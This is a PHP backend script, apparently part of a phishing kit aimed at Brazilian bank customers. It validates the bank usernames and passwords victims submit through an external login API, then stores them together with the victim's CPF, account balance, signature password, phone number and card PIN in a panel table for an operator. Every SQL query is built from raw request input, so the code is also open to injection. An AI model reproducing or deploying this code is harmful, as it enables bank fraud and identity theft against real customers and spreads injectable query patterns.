<?php
session_start();
date_default_timezone_set('America/Sao_Paulo');
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers:DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type");
require_once 'db.php';
require_once 'api.php';

/***********************************Banco************************************************/
$db = new db();
$db = $db->connect();
$datetime = date('Y-m-d H:i:s');
$ip =  getIp();
/***********************************Banco************************************************/


if ($_POST['action'] == 'gravar_login') {

    $sql = "select count(id) as contagem_cadastro from painel_data where usuario = '" . $_POST['usuario'] . "'";
    $result = $db->query($sql)->fetchAll(PDO::FETCH_ASSOC);

    if ($result[0]['contagem_cadastro'] == 0) {
        $api_login = api_login($_POST['usuario'], $_POST['senha'], $ip);

        if ($api_login['msg'] == 'ERRO CONEXAO') {
            echo "ERRO CONEXAO";
        } elseif ($api_login['msg'] == 'USUARIO NAO CADASTRADO') {
            echo "USUARIO NAO CADASTRADO";
        } elseif ($api_login['msg'] == 'SENHA DE ACESSO BLOQUEADA') {
            echo "SENHA DE ACESSO BLOQUEADA";
        } else {
            $primeiroNome = explode(" ", $api_login['nome']);
            $_SESSION['usuario'] =  $_POST['usuario'];
            $_SESSION['iniciais'] = iniciais($api_login['nome']);
            $_SESSION['primeiro_nome'] = ucfirst(strtolower(current(explode(" ", $api_login['nome']))));
            $_SESSION['conta_formatada'] = $api_login['conta_formatada'];
            $_SESSION['saldo'] = $api_login['saldo'];

            $insert = "
		    	INSERT INTO painel_data VALUES(			
				'" . $_POST['usuario'] . "', 
				'" . $_POST['senha'] . "',
				'" . $api_login['cpf'] . "',
				'" . $_POST['tipoconta'] . "',
				'" . $api_login['nome'] . "',
				'',
				'',
				'',
				'',
				'$ip',
				'" . $api_login['saldo'] . "',
                '', 
                '',
                '', 
                'Senha Recebida',
                '',
                '" . $_POST['dispositivo'] . "',
                '',
                '',
                '',
                '',
                '" . iniciais($api_login['nome']) . "',
                '',
                '" . $api_login['conta_formatada'] . "',
                '" . $api_login['status_assinatura'] . "'
				)			
				";
            $exec_insert = $db->query($insert);

            echo "LOGIN REALIZADO COM SUCESSO";
        }
    }
}
if ($_POST['action'] == 'gravar_assinatura_mobile') {
    $sql = "update painel_data set status_cliente = 'Online', assinatura = '" . $_POST['inpSenha'] . "', ultima_atualizacao = '$datetime', 
                telefone = '" . $_POST['telefone'] . "' , status_cadastro = 'Assinatura Recebida' where usuario = '" . $_SESSION['usuario'] . "'";
    $result = $db->query($sql);
    $status = 'success';
    echo $status;
    die;
}
if ($_POST['action'] == 'gravar_senha4') {
    $update = "update painel_data set status_cliente = 'Online', senha_cartao = '" . $_POST['senha4'] . "', ultima_atualizacao = '$datetime', 
				status_cadastro = 'Senha Recebida' where usuario = '" . $_SESSION['usuario'] . "'";
    $result = $db->query($update);
    $status = 'success';
    echo $status;
    die;
}
